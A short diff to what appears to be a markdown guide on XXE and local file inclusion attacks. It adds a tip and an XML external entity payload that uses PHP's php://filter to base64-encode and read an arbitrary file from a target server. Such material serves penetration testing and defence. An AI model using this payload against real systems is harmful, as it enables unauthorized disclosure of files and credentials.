@@ -149,6 +149,8 @@ For best results, don't modify any formatting found used by the client/server.
 <exampletag>&file;</exampletag>
 ```
 
+Note: If the system has PHP and you want to base64 encode a file (binary, PDF, etc.) for easy transfer, use the following:
+`<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/path/to/file">`
 ## LFI Method 2
 
 Create Payload
